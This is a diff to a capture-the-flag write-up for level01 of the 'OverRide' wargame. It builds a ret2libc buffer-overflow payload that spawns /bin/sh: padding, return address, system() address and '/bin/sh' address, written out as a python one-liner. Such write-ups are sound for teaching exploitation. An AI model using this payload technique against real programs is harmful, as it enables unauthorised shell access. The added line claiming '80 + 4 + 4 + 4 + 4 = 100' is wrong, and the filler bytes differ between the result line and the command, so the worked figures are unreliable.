@@ -128,6 +128,14 @@ we find the /bin/sh addr 0xf7f897ec
 0x080485b5 <+229>:	ret
 ```
 
+```
+[...]
+   0x08048565 <+149>:	movl   $0x64,0x4(%esp)
+[...]
+```
+
+the row of password field is 100 chars
+
 build exploit:
 
 USERNAME + '\n'(next fgets) + 'A' * 80 + RETURN_MAIN_FUNCTION + SYSTEM_FUNCTION_ADDR + 4_CHARs + ADDR_OF_/bin/sh
@@ -135,6 +143,8 @@ USERNAME + '\n'(next fgets) + 'A' * 80 + RETURN_MAIN_FUNCTION + SYSTEM_FUNCTION_
 result:
 
 'dat_wil' + '\n' + 'A' * 80 + '\xb5\x85\x04\x08' + '\xd0\xae\xe6\xf7' + 'DUMP' + '\xec\x97\xf8\xf7'
+
+80 + 4 + 4 + 4 + 4 = 100
 
 ```
 level01@OverRide:~$ python -c "print 'dat_wil' + '\n' + 'A' * 80 + '\xb5\x85\x04\x08' + '\xd0\xae\xe6\xf7' + 'A' * 4 + '\xec\x97\xf8\xf7'" > /tmp/level1
